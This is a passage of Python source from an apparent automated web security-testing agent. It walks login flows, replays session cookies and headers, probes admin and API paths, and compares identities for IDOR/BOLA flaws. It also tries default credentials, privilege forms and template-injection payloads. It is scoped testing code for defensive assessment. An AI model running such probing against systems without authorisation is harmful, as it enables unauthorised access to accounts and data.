    if absolute_location == submitted.url:
        return None
    return {
        "type": "auth_workflow_progress_signal",
        "form": _auth_form_brief(form),
        "status": submitted.status,
        "location": absolute_location,
        "detail": "auth form submission advanced to a same-origin follow-up step",
        "next": "Follow the location with the same cookie jar, preserve CSRF fields, and use the replay values that satisfy observed form constraints.",
        "replay": {
            "method": str(form.get("method") or "GET").upper(),
            "url": str(form.get("action") or ""),
            "form": fields,
            "encoding": "application/x-www-form-urlencoded",
            "followup_steps": second_step.replay_steps,
        },
    }


def _complete_password_step(
    session: ProbeSession,
    response: ProbeResponse,
    identity: dict[str, str],
) -> SecondStepResult:
    requests: list[dict[str, object]] = []
    replay_steps: list[dict[str, object]] = []
    auth_headers: list[dict[str, str]] = []
    candidates: list[ProbeResponse] = []
    location = str(response.headers.get("location") or response.headers.get("Location") or "")
    if location and _same_origin_or_relative(session, location):
        page = session.get(location)
        requests.append(
            page.summary(body_chars=360)
            | {"probe_kind": "auth_password_step_page", "location": location}
        )
        candidates.append(page)
    if _body_has_password_form(response.body):
        candidates.append(response)
    for page in candidates[:3]:
        script_headers = _script_identity_headers(page.body)
        for form in _forms_from_html(
            page.final_url, page.body, auth_headers={}, base_categories=()
        ):
            if not _form_has_password_input(form):
                continue
            form = _script_adjusted_password_form(form, page, script_headers)
            fields = _identity_fields(form, identity)
            headers = _form_script_headers(form)
            submitted = _submit_form(session, form, fields, headers=headers)
            auth_headers.extend(_identity_header_replay_variants(headers))
            replay_steps.append(
                {
                    "method": str(form.get("method") or "GET").upper(),
                    "url": str(form.get("action") or page.final_url),
                    "form": fields,
                    "headers": _redact_auth_headers(headers),
                    "encoding": "application/x-www-form-urlencoded",
                }
            )
            requests.append(
                submitted.summary(body_chars=420)
                | {
                    "probe_kind": "auth_password_step_submit",
                    "form": _auth_form_brief(form),
                    "username": identity["username"],
                    "headers_used": _redact_auth_headers(headers),
                }
            )
            return SecondStepResult(
                final_response=submitted,
                requests=requests,
                auth_headers=_dedupe_headers(auth_headers),
                replay_steps=replay_steps,
            )
    final_response = _walk_auth_followup_forms(
        session=session,
        pages=candidates[:3],
        identity=identity,
        requests=requests,
        auth_headers=auth_headers,
        replay_steps=replay_steps,
    )
    if final_response is not None:
        return SecondStepResult(
            final_response=final_response,
            requests=requests,
            auth_headers=_dedupe_headers(auth_headers),
            replay_steps=replay_steps,
        )
    return SecondStepResult(
        final_response=None,
        requests=requests,
        auth_headers=_dedupe_headers(auth_headers),
        replay_steps=replay_steps,
    )


def _walk_auth_followup_forms(
    *,
    session: ProbeSession,
    pages: list[ProbeResponse],
    identity: dict[str, str],
    requests: list[dict[str, object]],
    auth_headers: list[dict[str, str]],
    replay_steps: list[dict[str, object]],
) -> ProbeResponse | None:
    final_response: ProbeResponse | None = None
    seen_forms: set[str] = set()
    for start_page in pages:
        current = start_page
        for step in range(5):
            current = _follow_auth_redirect(session, current, requests, step=step)
            final_response = current
            if recognize_proofs(current.body):
                return current
            forms = _forms_from_html(
                current.final_url, current.body, auth_headers={}, base_categories=()
            )
            form = _next_flow_form(forms)
            if form is None:
                break
            key = _flow_form_key(form)
            if key in seen_forms:
                break
            seen_forms.add(key)
            script_headers = _script_identity_headers(current.body)
            if _form_has_password_input(form):
                form = _script_adjusted_password_form(form, current, script_headers)
            fields = _identity_fields(form, identity)
            headers = _form_script_headers(form)
            submitted = _submit_form(session, form, fields, headers=headers)
            auth_headers.extend(_identity_header_replay_variants(headers))
            replay_steps.append(
                {
                    "method": str(form.get("method") or "GET").upper(),
                    "url": str(form.get("action") or current.final_url),
                    "form": fields,
                    "headers": _redact_auth_headers(headers),
                    "encoding": "application/x-www-form-urlencoded",
                }
            )
            requests.append(
                submitted.summary(body_chars=520)
                | {
                    "probe_kind": "auth_followup_form_submit",
                    "form": _auth_form_brief(form),
                    "username": identity["username"],
                    "headers_used": _redact_auth_headers(headers),
                }
            )
            current = submitted
            final_response = submitted
            if recognize_proofs(submitted.body):
                return submitted
    return final_response


def _follow_auth_redirect(
    session: ProbeSession,
    response: ProbeResponse,
    requests: list[dict[str, object]],
    *,
    step: int,
) -> ProbeResponse:
    current = response
    for _redirect in range(3):
        location = str(current.headers.get("location") or current.headers.get("Location") or "")
        if not location or not _same_origin_or_relative(session, location):
            break
        current = session.get(location)
        requests.append(
            current.summary(body_chars=420)
            | {"probe_kind": "auth_followup_redirect_page", "location": location, "step": step}
        )
    return current


def _flow_form_key(form: dict[str, object]) -> str:
    names: list[str] = []
    for item in _list_of_dicts(form.get("inputs")):
        name = str(item.get("name") or "")
        if name:
            names.append(name)

    method = str(form.get("method") or "GET").upper()
    action = str(form.get("action") or "")
    return json.dumps(
        {
            "method": method,
            "action": action,
            "names": names,
        },
        sort_keys=True,
    )


def _identity_header_replay_variants(headers: dict[str, str]) -> list[dict[str, str]]:
    variants: list[dict[str, str]] = []
    for name, value in headers.items():
        if _looks_identity_header_name(name) and value:
            variants.append({name: value})
    return variants


def _same_origin_or_relative(session: ProbeSession, value: str) -> bool:
    if not value:
        return False
    if value.startswith("/"):
        return True
    return session.in_scope(value)


def _same_origin_followup_urls(session: ProbeSession, base_url: str, body: str) -> list[str]:
    urls: list[str] = []
    for pattern in (
        r"""(?is)\b(?:href|src|action)\s*=\s*(['"])([^'"]{1,500})\1""",
        r"""(?is)([`'"])(/[A-Za-z0-9._~:/?#@!$&()*+,;=%${}-]{1,500})\1""",
    ):
        for match in re.finditer(pattern, body):
            value = html.unescape(match.group(2).strip())
            if not value or value.startswith(("javascript:", "data:", "mailto:", "#")):
                continue
            absolute = urljoin(base_url, value)
            if not session.in_scope(absolute):
                continue
            path = urlsplit(absolute).path.lower()
            if path.endswith(
                (".css", ".js", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico", ".woff", ".woff2")
            ):
                continue
            urls.append(absolute)
    urls.extend(_same_origin_ajax_urls(session, base_url, body))
    urls.extend(_archive_collection_followup_urls(session, base_url, urls))
    return _dedupe(urls)[:16]


def _same_origin_ajax_urls(session: ProbeSession, base_url: str, body: str) -> list[str]:
    urls: list[str] = []
    for block in _ajax_object_blocks(body):
        raw_url = _ajax_string_property(block, "url")
        if not raw_url:
            continue
        absolute = urljoin(base_url, html.unescape(raw_url))
        if not session.in_scope(absolute):
            continue
        urls.append(absolute)
        data = _ajax_data_defaults(block)
        if data:
            urls.append(_url_with_query_defaults(absolute, data))
    return urls


def _ajax_object_blocks(body: str) -> list[str]:
    blocks: list[str] = []
    pattern = r"(?is)(?:\$|\bjQuery)\s*\.\s*ajax\s*\(\s*\{(.*?)\}\s*\)"
    for match in re.finditer(pattern, body):
        blocks.append(match.group(1))
    return blocks[:12]


def _ajax_string_property(block: str, name: str) -> str:
    pattern = rf"\b{name}\s*:\s*([`'\"])([^`'\"\r\n]{{1,500}})\1"
    match = re.search(pattern, block, flags=re.IGNORECASE)
    if match is None:
        return ""
    return match.group(2).strip()


def _ajax_data_defaults(block: str) -> dict[str, str]:
    data_block = _ajax_object_property(block, "data")
    if not data_block:
        return {}

    defaults: dict[str, str] = {}
    for name, raw_value in _ajax_object_pairs(data_block):
        defaults[name] = _ajax_default_value(name, raw_value)
    return defaults


def _ajax_object_property(block: str, name: str) -> str:
    match = re.search(rf"\b{name}\s*:\s*\{{", block, flags=re.IGNORECASE)
    if match is None:
        return ""

    open_brace = match.end() - 1
    close_brace = _matching_brace(block, open_brace)
    if close_brace <= open_brace:
        return ""
    return block[open_brace + 1 : close_brace]


def _matching_brace(text: str, open_brace: int) -> int:
    depth = 0
    quote = ""
    escaped = False
    for index in range(open_brace, len(text)):
        char = text[index]
        if quote:
            if escaped:
                escaped = False
                continue
            if char == "\\":
                escaped = True
                continue
            if char == quote:
                quote = ""
            continue
        if char in {"'", '"', "`"}:
            quote = char
            continue
        if char == "{":
            depth += 1
            continue
        if char == "}":
            depth -= 1
            if depth == 0:
                return index
    return -1


def _ajax_object_pairs(body: str) -> list[tuple[str, str]]:
    pairs: list[tuple[str, str]] = []
    pattern = (
        r"(?:^|,)\s*"
        r"(?:([A-Za-z_$][\w$]*)|['\"]([^'\"]{1,80})['\"])\s*:\s*"
        r"([^,\r\n}]{1,200})"
    )
    for match in re.finditer(pattern, body):
        name = match.group(1) or match.group(2) or ""
        raw_value = match.group(3).strip()
        if name:
            pairs.append((name, raw_value))
    return pairs[:20]


def _ajax_default_value(name: str, raw_value: str) -> str:
    literal = _ajax_literal_value(raw_value)
    if literal:
        return literal
    lowered = name.lower()
    if any(marker in lowered for marker in ("term", "month", "year", "duration")):
        return "1"
    if any(marker in lowered for marker in ("principal", "payment", "amount", "rate", "total")):
        return "1"
    if lowered == "id" or lowered.endswith("id"):
        return "1"
    return "ravage"


def _ajax_literal_value(raw_value: str) -> str:
    text = raw_value.strip()
    quoted = re.fullmatch(r"([`'\"])(.*?)\1", text)
    if quoted is not None:
        return html.unescape(quoted.group(2))
    numeric = re.fullmatch(r"-?\d+(?:\.\d+)?", text)
    if numeric is not None:
        return numeric.group(0)
    return ""


def _url_with_query_defaults(url: str, defaults: dict[str, str]) -> str:
    try:
        parsed = urlsplit(url)
    except ValueError:
        return url

    pairs = parse_qsl(parsed.query, keep_blank_values=True)
    existing = {name for name, _value in pairs}
    for name, value in defaults.items():
        if name not in existing:
            pairs.append((name, value))
    query = urlencode(pairs)
    return urlunsplit((parsed.scheme, parsed.netloc, parsed.path, query, parsed.fragment))


def _archive_collection_followup_urls(
    session: ProbeSession, base_url: str, discovered_urls: list[str]
) -> list[str]:
    paths: list[str] = []
    candidate_urls = [base_url]
    candidate_urls.extend(discovered_urls)
    for url in candidate_urls:
        try:
            parsed = urlsplit(url)
        except ValueError:
            continue
        paths.append(parsed.path)
    if not _paths_include_archive(paths):
        return []
    urls: list[str] = []
    for path in paths:
        stripped = path.strip("/")
        if not stripped or "archive" in stripped.lower():
            continue
        segments = stripped.split("/")
        leaf = segments[-1]
        if not leaf.endswith("s") or len(leaf) <= 2:
            continue

        if len(segments) > 1:
            prefix = "/" + "/".join(segments[:-1])
        else:
            prefix = ""

        candidates = (
            f"{prefix}/{leaf}_archive",
            f"{prefix}/{leaf}/archive",
            f"{prefix}/archived_{leaf}",
        )
        for candidate in candidates:
            absolute = urljoin(base_url, candidate)
            if session.in_scope(absolute):
                urls.append(absolute)
    return urls[:6]


def _paths_include_archive(paths: list[str]) -> bool:
    for path in paths:
        if "archive" in path.lower():
            return True
    return False


def _identity_delta(
    *,
    session_a: ProbeSession,
    session_b: ProbeSession,
    state: AgentState,
) -> IdentityDelta:
    requests: list[dict[str, object]] = []
    for url in _session_followup_urls(session_a, state):
        response_a = session_a.get(url)
        response_b = session_b.get(url)
        requests.append(response_a.summary(body_chars=260) | {"probe_kind": "identity_a_followup"})
        requests.append(response_b.summary(body_chars=260) | {"probe_kind": "identity_b_followup"})
        proofs = recognize_proofs(response_a.body + "\n" + response_b.body)
        if proofs:
            return IdentityDelta(
                finding={
                    "type": "session_followup_proof",
                    "url": url,
                    "proofs": proofs,
                    "response_a": response_a.summary(body_chars=500),
                    "response_b": response_b.summary(body_chars=500),
                },
                requests=requests,
            )
        signal = _session_identity_signal(response_a, response_b)
        if signal:
            return IdentityDelta(
                finding={
                    "type": "two_identity_session_delta",
                    "url": url,
                    "signal": signal,
                    "response_a": response_a.summary(body_chars=420),
                    "response_b": response_b.summary(body_chars=420),
                    "next": "Use these two session templates for IDOR/BOLA comparison on object-specific URLs.",
                },
                requests=requests,
            )
    return IdentityDelta(finding=None, requests=requests)


@dataclass
class _FollowupRun:
    urls: list[str]
    cap: int
    requests: list[dict[str, object]]
    best_signal: dict[str, object] | None = None
    endpoints: list[str] = field(default_factory=list)
    object_ids: list[str] = field(default_factory=list)
    object_templates: list[str] = field(default_factory=list)
    index: int = 0

    def next_url(self) -> str | None:
        if self.index >= len(self.urls):
            return None
        if self.index >= self.cap:
            return None

        url = self.urls[self.index]
        self.index += 1
        return url

    def add_discovered_endpoints(self, response: ProbeResponse, discovered: list[str]) -> None:
        if not discovered:
            return

        candidates: list[str] = []
        if response.final_url:
            candidates.append(response.final_url)
        candidates.extend(discovered)
        self.endpoints = _merge_limited_strings(self.endpoints, candidates, limit=24)

        for endpoint in discovered:
            if endpoint in self.urls:
                continue
            if len(self.urls) >= self.cap:
                break
            self.urls.insert(self.index, endpoint)

        self.refresh_best_signal_endpoints()

    def add_object_candidates(self, response: ProbeResponse) -> None:
        self.object_ids = _merge_limited_strings(
            self.object_ids,
            _html_object_ids(response.body),
            limit=24,
        )
        self.object_templates = _merge_limited_strings(
            self.object_templates,
            _client_side_object_templates(response.body),
            limit=12,
        )

    def refresh_best_signal_endpoints(self) -> None:
        signal = self.best_signal
        if signal is None:
            return
        if not _is_auth_session_followup_signal(signal):
            return

        existing = _string_items(signal.get("endpoints"))
        signal["endpoints"] = _merge_limited_strings(existing, self.endpoints, limit=24)


def _single_session_followup(
    *,
    session: ProbeSession,
    state: AgentState,
    username: str,
    auth_headers: list[dict[str, str]],
    seed_urls: list[str] | None = None,
) -> IdentityDelta:
    followup = _new_followup_run(
        session=session,
        state=state,
        seed_urls=seed_urls,
        cap=_FOLLOWUP_LIMIT + 16,
    )
    header_options = _followup_header_options(auth_headers, limit=_AUTH_HEADER_LIMIT)

    while True:
        url = followup.next_url()
        if url is None:
            break

        for headers in header_options:
            result = _single_followup_attempt(
                session=session,
                state=state,
                username=username,
                url=url,
                headers=headers,
                followup=followup,
            )
            if result is not None:
                return result

    return _followup_result(followup)


def _quick_session_followup(
    *,
    session: ProbeSession,
    state: AgentState,
    username: str,
    password: str,
    auth_headers: list[dict[str, str]],
    seed_urls: list[str] | None = None,
) -> IdentityDelta:
    followup = _new_followup_run(
        session=session,
        state=state,
        seed_urls=seed_urls,
        cap=18,
    )
    header_options = _followup_header_options(auth_headers, limit=2)

    while True:
        url = followup.next_url()
        if url is None:
            break

        for headers in header_options:
            result = _quick_followup_attempt(
                session=session,
                state=state,
                username=username,
                password=password,
                url=url,
                headers=headers,
                followup=followup,
            )
            if result is not None:
                return result

    return _followup_result(followup)


def _new_followup_run(
    *,
    session: ProbeSession,
    state: AgentState,
    seed_urls: list[str] | None,
    cap: int,
) -> _FollowupRun:
    urls: list[str] = []
    if seed_urls:
        urls.extend(seed_urls)
    urls.extend(_session_followup_urls(session, state))
    return _FollowupRun(urls=_dedupe(urls), cap=cap, requests=[])


def _followup_header_options(
    auth_headers: list[dict[str, str]], *, limit: int
) -> list[dict[str, str]]:
    options: list[dict[str, str]] = [{}]
    for headers in auth_headers[:limit]:
        options.append(headers)
    return options


def _single_followup_attempt(
    *,
    session: ProbeSession,
    state: AgentState,
    username: str,
    url: str,
    headers: dict[str, str],
    followup: _FollowupRun,
) -> IdentityDelta | None:
    response, terminal_result = _fetch_and_check_followup_response(
        session=session,
        url=url,
        headers=headers,
        username=username,
        followup=followup,
        quick=False,
    )
    if terminal_result is not None:
        return terminal_result

    signal = _authenticated_followup_signal(response, headers=headers)
    replay_headers, forms = _followup_forms(session=session, response=response, headers=headers)
    _merge_forms_into_best_signal(followup, forms=forms, replay_headers=replay_headers)

    privilege_result = _run_privilege_followup(
        session=session,
        state=state,
        username=username,
        url=url,
        headers=headers,
        forms=forms,
        followup=followup,
    )
    if privilege_result is not None:
        return privilege_result

    _record_auth_followup_signal_if_absent(
        followup=followup,
        url=url,
        username=username,
        headers=headers,
        replay_headers=replay_headers,
        forms=forms,
        signal=signal,
        response=response,
        next_message="Replay this authenticated request template on object-specific routes and API endpoints.",
    )

    return None


def _quick_followup_attempt(
    *,
    session: ProbeSession,
    state: AgentState,
    username: str,
    password: str,
    url: str,
    headers: dict[str, str],
    followup: _FollowupRun,
) -> IdentityDelta | None:
    response, terminal_result = _fetch_and_check_followup_response(
        session=session,
        url=url,
        headers=headers,
        username=username,
        followup=followup,
        quick=True,
    )
    if terminal_result is not None:
        return terminal_result

    replay_headers, forms = _followup_forms(session=session, response=response, headers=headers)
    preserved_forms = _preserve_working_credential_values(
        forms, username=username, password=password
    )
    _merge_forms_into_best_signal(followup, forms=preserved_forms, replay_headers=replay_headers)

    privilege_result = _run_privilege_followup(
        session=session,
        state=state,
        username=username,
        url=url,
        headers=headers,
        forms=preserved_forms,
        followup=followup,
    )
    if privilege_result is not None:
        return privilege_result

    signal = _authenticated_followup_signal(response, headers=headers)
    _record_auth_followup_signal_if_absent(
        followup=followup,
        url=url,
        username=username,
        headers=headers,
        replay_headers=replay_headers,
        forms=preserved_forms,
        signal=signal,
        response=response,
        next_message="Replay this authenticated cookie/header context with IDOR/BOLA and privilege-boundary specialists.",
    )

    return None


def _fetch_and_check_followup_response(
    *,
    session: ProbeSession,
    url: str,
    headers: dict[str, str],
    username: str,
    followup: _FollowupRun,
    quick: bool,
) -> tuple[ProbeResponse, IdentityDelta | None]:
    response = _fetch_followup_response(
        session=session,
        url=url,
        headers=headers,
        username=username,
        followup=followup,
        quick=quick,
    )
    _update_followup_surface(followup, session, response, url)
    terminal_result = _terminal_response_followup(
        session=session,
        response=response,
        url=url,
        username=username,
        headers=headers,
        followup=followup,
    )
    return response, terminal_result


def _terminal_response_followup(
    *,
    session: ProbeSession,
    response: ProbeResponse,
    url: str,
    username: str,
    headers: dict[str, str],
    followup: _FollowupRun,
) -> IdentityDelta | None:
    proof = _session_followup_proof(
        response, url=url, username=username, headers=headers, requests=followup.requests
    )
    if proof is not None:
        return proof

    return _run_client_followup(
        session=session, response=response, headers=headers, followup=followup
    )


def _followup_forms(
    *,
    session: ProbeSession,
    response: ProbeResponse,
    headers: dict[str, str],
) -> tuple[dict[str, str], list[dict[str, object]]]:
    replay_headers = _replay_headers_for_followup(session=session, headers=headers)
    forms = _forms_from_html(response.final_url, response.body, auth_headers=replay_headers)
    return replay_headers, forms


def _record_auth_followup_signal_if_absent(
    *,
    followup: _FollowupRun,
    url: str,
    username: str,
    headers: dict[str, str],
    replay_headers: dict[str, str],
    forms: list[dict[str, object]],
    signal: dict[str, object],
    response: ProbeResponse,
    next_message: str,
) -> None:
    if not signal:
        return
    if followup.best_signal is not None:
        return

    followup.best_signal = _auth_followup_signal_finding(
        url=url,
        username=username,
        headers=headers,
        replay_headers=replay_headers,
        forms=forms,
        endpoints=followup.endpoints,
        signal=signal,
        response=response,
        next_message=next_message,
    )


def _fetch_followup_response(
    *,
    session: ProbeSession,
    url: str,
    headers: dict[str, str],
    username: str,
    followup: _FollowupRun,
    quick: bool,
) -> ProbeResponse:
    response = session.get(url, headers=_optional_headers(headers))
    payload = response.summary(body_chars=_followup_body_chars(quick=quick))
    payload["probe_kind"] = _followup_probe_kind(headers=headers, quick=quick)
    payload["username"] = username
    payload["headers_used"] = _redact_auth_headers(headers)
    followup.requests.append(payload)
    return response


def _followup_probe_kind(*, headers: dict[str, str], quick: bool) -> str:
    if quick:
        if headers:
            return "default_credentials_quick_auth_material_followup"
        return "default_credentials_quick_followup"

    if headers:
        return "auth_material_followup"
    return "auth_session_followup"


def _followup_body_chars(*, quick: bool) -> int:
    if quick:
        return 360
    return 420


def _optional_headers(headers: dict[str, str]) -> dict[str, str] | None:
    if headers:
        return headers
    return None


def _update_followup_surface(
    followup: _FollowupRun,
    session: ProbeSession,
    response: ProbeResponse,
    requested_url: str,
) -> None:
    base_url = response.final_url
    if not base_url:
        base_url = requested_url

    discovered = _same_origin_followup_urls(session, base_url, response.body)
    followup.add_discovered_endpoints(response, discovered)
    followup.add_object_candidates(response)


def _session_followup_proof(
    response: ProbeResponse,
    *,
    url: str,
    username: str,
    headers: dict[str, str],
    requests: list[dict[str, object]],
) -> IdentityDelta | None:
    proofs = recognize_proofs(response.body)
    if not proofs:
        return None

    return IdentityDelta(
        finding={
            "type": "session_followup_proof",
            "url": url,
            "username": username,
            "headers_used": _redact_auth_headers(headers),
            "proofs": proofs,
            "response": response.summary(body_chars=700),
        },
        requests=requests,
    )


def _run_client_followup(
    *,
    session: ProbeSession,
    response: ProbeResponse,
    headers: dict[str, str],
    followup: _FollowupRun,
) -> IdentityDelta | None:
    client_followup = _client_side_authenticated_followup(
        session=session,
        response=response,
        headers=headers,
        object_ids=followup.object_ids,
        object_templates=followup.object_templates,
    )
    followup.requests.extend(client_followup.requests)
    return _record_nonterminal_followup(client_followup, followup)


def _run_privilege_followup(
    *,
    session: ProbeSession,
    state: AgentState,
    username: str,
    url: str,
    headers: dict[str, str],
    forms: list[dict[str, object]],
    followup: _FollowupRun,
) -> IdentityDelta | None:
    privilege_followup = _authenticated_privilege_form_followup(
        session=session,
        state=state,
        username=username,
        seed_url=url,
        forms=forms,
        headers=headers,
    )
    followup.requests.extend(privilege_followup.requests)
    return _record_nonterminal_followup(privilege_followup, followup)


def _record_nonterminal_followup(
    result: IdentityDelta, followup: _FollowupRun
) -> IdentityDelta | None:
    finding = result.finding
    if not finding:
        return None
    if _terminal_followup_finding(finding):
        return result
    if followup.best_signal is None:
        followup.best_signal = finding
    return None


def _terminal_followup_finding(finding: dict[str, object]) -> bool:
    finding_type = str(finding.get("type") or "")
    if finding_type.endswith(("_proof", "_secret")):
        return True
    return bool(finding.get("proofs"))


def _merge_forms_into_best_signal(
    followup: _FollowupRun,
    *,
    forms: list[dict[str, object]],
    replay_headers: dict[str, str],
) -> None:
    if not forms:
        return

    signal = followup.best_signal
    if signal is None:
        return
    if not _is_auth_session_followup_signal(signal):
        return

    merged_forms = _list_of_dicts(signal.get("forms"))
    merged_forms.extend(forms)
    signal["forms"] = _dedupe_dicts(merged_forms)[:12]
    followup.refresh_best_signal_endpoints()

    if not signal.get("auth_replay_headers"):
        signal["auth_replay_headers"] = replay_headers


def _is_auth_session_followup_signal(finding: dict[str, object] | None) -> bool:
    if finding is None:
        return False
    finding_type = str(finding.get("type") or "")
    return finding_type == "auth_session_followup_signal"


def _auth_followup_signal_finding(
    *,
    url: str,
    username: str,
    headers: dict[str, str],
    replay_headers: dict[str, str],
    forms: list[dict[str, object]],
    endpoints: list[str],
    signal: dict[str, object],
    response: ProbeResponse,
    next_message: str,
) -> dict[str, object]:
    return {
        "type": "auth_session_followup_signal",
        "url": url,
        "username": username,
        "headers_used": _redact_auth_headers(headers),
        "auth_replay_headers": replay_headers,
        "forms": forms,
        "endpoints": endpoints[:24],
        "signal": signal,
        "response": response.summary(body_chars=520),
        "next": next_message,
    }


def _followup_result(followup: _FollowupRun) -> IdentityDelta:
    if followup.best_signal is not None:
        return IdentityDelta(finding=followup.best_signal, requests=followup.requests)
    return IdentityDelta(finding=None, requests=followup.requests)


def _merge_limited_strings(current: list[str], additions: list[str], *, limit: int) -> list[str]:
    merged: list[str] = []
    merged.extend(current)
    for value in additions:
        if value:
            merged.append(value)
    return _dedupe(merged)[:limit]


def _post_login_seed_urls(*, session: ProbeSession, findings: list[dict[str, object]]) -> list[str]:
    urls: list[str] = []
    for finding in findings:
        final_url = str(finding.get("final_url") or "")
        if final_url:
            urls.append(final_url)
            urls.extend(_object_sibling_urls(session, final_url))

    scoped: list[str] = []
    for url in urls:
        if session.in_scope(url):
            scoped.append(url)
    return _dedupe(scoped)[:12]


def _session_followup_urls(session: ProbeSession, state: AgentState) -> list[str]:
    urls: list[str] = []
    for endpoint in _surface_endpoints(state):
        if _looks_like_session_endpoint(endpoint):
            urls.append(endpoint)
    for path in (
        "/",
        "/admin",
        "/settings",
        "/dashboard",
        "/account",
        "/me",
        "/user",
        "/profile",
        "/json",
        "/home",
        "/loan",
        "/loans",
        "/loan_details",
        "/payments",
        "/calculator",
        "/calc",
        "/orders",
        "/archive",
        "/receipts",
        "/invoices",
        "/transactions",
        "/records",
        "/wp-admin/",
        "/wp-admin/admin.php?page=backup-migration",
        "/wp-admin/admin-ajax.php",
        "/api",
        "/api/me",
        "/api/user",
        "/api/users",
        "/companies",
        "/jobs",
    ):
        urls.append(session.absolute(path))
    return _dedupe_scoped_urls(session, urls, limit=_FOLLOWUP_LIMIT)


def _replay_headers_for_followup(
    *, session: ProbeSession, headers: dict[str, str]
) -> dict[str, str]:
    replay_headers = dict(headers)
    cookie_header = _session_cookie_header(session)
    if cookie_header and "Cookie" not in replay_headers:
        replay_headers["Cookie"] = cookie_header
    return replay_headers


def _session_cookie_header(session: ProbeSession) -> str:
    cookies = []
    for cookie in session.cookies:
        if cookie.name and cookie.value:
            cookies.append(f"{cookie.name}={cookie.value}")
    return "; ".join(cookies)


def _looks_like_session_endpoint(url: str) -> bool:
    lowered = url.lower()
    return any(
        marker in lowered
        for marker in (
            "profile",
            "account",
            "home",
            "dashboard",
            "settings",
            "admin",
            "user",
            "me",
            "order",
            "invoice",
            "loan",
            "payment",
            "calc",
            "quote",
            "total",
            "company",
            "companies",
            "job",
            "jobs",
            "edit",
            "json",
            "api",
        )
    )


def _session_identity_signal(
    response_a: ProbeResponse,
    response_b: ProbeResponse,
) -> dict[str, object]:
    if response_a.status != response_b.status:
        return {"kind": "status_delta", "a": response_a.status, "b": response_b.status}
    markers_a = _session_markers(response_a.body)
    markers_b = _session_markers(response_b.body)
    if markers_a != markers_b:
        return {"kind": "marker_delta", "a": markers_a, "b": markers_b}
    if _body_hash(response_a.body) != _body_hash(response_b.body) and _body_contains_identity_data(
        response_a.body + response_b.body
    ):
        return {
            "kind": "identity_body_delta",
            "a_len": len(response_a.body),
            "b_len": len(response_b.body),
        }
    return {}


def _session_markers(body: str) -> list[str]:
    return _body_words(
        body,
        (
            "logout",
            "profile",
            "account",
            "dashboard",
            "settings",
            "admin",
            "email",
            "username",
            "role",
        ),
    )


def _body_contains_identity_data(body: str) -> bool:
    lowered = body.lower()
    for marker in ("email", "username", "profile", "account", "user", "role"):
        if marker in lowered:
            return True
    return False


def _body_hash(body: str) -> str:
    return hashlib.sha256(body[:20_000].encode("utf-8", errors="replace")).hexdigest()


def _deferred_form_flow_followup(
    base_session: ProbeSession,
    forms: list[dict[str, object]],
    findings: list[dict[str, object]],
    requests: list[dict[str, object]],
    *,
    started: float | None = None,
) -> None:
    spent = 0
    for form in forms[:3]:
        if started is not None and _auth_deadline_exceeded(started):
            return
        if not _form_looks_deferred_flow(form):
            continue
        for payload in _DEFERRED_FORM_FLOW_PAYLOADS:
            if spent >= _DEFERRED_FORM_FLOW_LIMIT:
                return
            if started is not None and _auth_deadline_exceeded(started):
                return
            session = _fork_session(base_session, base_session.timeout_seconds)
            identity = _identity("flow")
            form = _fresh_form_for_submission(session, form)
            fields = _deferred_flow_fields(form, identity, payload, first_step=True)
            response = _submit_form(session, form, fields)
            spent += 1
            requests.append(
                response.summary(body_chars=360)
                | {
                    "probe_kind": "deferred_form_flow_submit",
                    "form": _form_brief(form),
                    "payload": payload,
                }
            )
            if record_auth_proof(
                response.body, findings, channel="deferred_form_flow", detail=_form_brief(form)
            ):
                return
            _record_deferred_eval_signal(
                response.body,
                findings,
                form=form,
                payload=payload,
                channel="deferred_form_flow",
            )
            current = response
            for _step in range(4):
                if spent >= _DEFERRED_FORM_FLOW_LIMIT:
                    return
                if started is not None and _auth_deadline_exceeded(started):
                    return
                location = str(
                    current.headers.get("location") or current.headers.get("Location") or ""
                )
                if location and _same_origin_or_relative(session, location):
                    current = session.get(location)
                    spent += 1
                    requests.append(
                        current.summary(body_chars=360)
                        | {"probe_kind": "deferred_form_flow_page", "location": location}
                    )
                    if record_auth_proof(
                        current.body, findings, channel="deferred_form_flow_page", detail=location
                    ):
                        return
                    _record_deferred_eval_signal(
                        current.body,
                        findings,
                        form=form,
                        payload=payload,
                        channel="deferred_form_flow_page",
                    )
                next_forms = _forms_from_html(
                    current.final_url, current.body, auth_headers={}, base_categories=()
                )
                next_form = _next_flow_form(next_forms)
                if next_form is None:
                    break
                fields = _deferred_flow_fields(next_form, identity, payload, first_step=False)
                current = _submit_form(session, next_form, fields)
                spent += 1
                requests.append(
                    current.summary(body_chars=420)
                    | {
                        "probe_kind": "deferred_form_flow_next",
                        "form": _form_brief(next_form),
                        "payload": payload,
                    }
                )
                if record_auth_proof(
                    current.body,
                    findings,
                    channel="deferred_form_flow_submit",
                    detail=_form_brief(next_form),
                ):
                    return
                _record_deferred_eval_signal(
                    current.body,
                    findings,
                    form=next_form,
                    payload=payload,
                    channel="deferred_form_flow_submit",
                )


def _record_deferred_eval_signal(
    body: str,
    findings: list[dict[str, object]],
    *,
    form: dict[str, object],
    payload: str,
    channel: str,
) -> None:
    signal = _deferred_eval_signal(body, payload=payload)
    if not signal:
        return
    finding = {
        "type": "deferred_form_flow_signal",
        "form": _form_brief(form),
        "payload": payload,
        "channel": channel,
        "signal": signal,
        "detail": "multi-step form rendered a server-side template expression result",
    }
    if finding not in findings:
        findings.append(finding)


def _form_looks_deferred_flow(form: dict[str, object]) -> bool:
    text = _form_text(form)
    for marker in ("register", "signup", "sign-up", "profile", "name", "email", "step"):
        if marker in text:
            return True
    return False


def _fresh_form_for_submission(session: ProbeSession, form: dict[str, object]) -> dict[str, object]:
    action = str(form.get("action") or session.target_url)
    page = session.get(action)
    return _fresh_form_from_response(form, page) or form


def _next_flow_form(forms: list[dict[str, object]]) -> dict[str, object] | None:
    for form in forms:
        if _form_has_password_input(form) and "login" in _form_text(form):
            continue
        return form
    return None


def _deferred_flow_fields(
    form: dict[str, object],
    identity: dict[str, str],
    payload: str,
    *,
    first_step: bool,
) -> dict[str, str]:
    original_fields = form_defaults(form)
    fields = _identity_fields(form, identity)
    if first_step:
        for name in _flow_payload_fields(form, fields):
            fields[name] = payload
            break
    else:
        for name, original_value in original_fields.items():
            if payload and payload in original_value:
                fields[name] = original_value
    for name in list(fields):
        lowered = name.lower()
        if payload and payload in fields[name]:
            continue
        if "email" in lowered:
            fields[name] = identity["email"]
        elif "pass" in lowered:
            fields[name] = identity["password"]
    return fields


def _flow_payload_fields(form: dict[str, object], fields: dict[str, str]) -> list[str]:
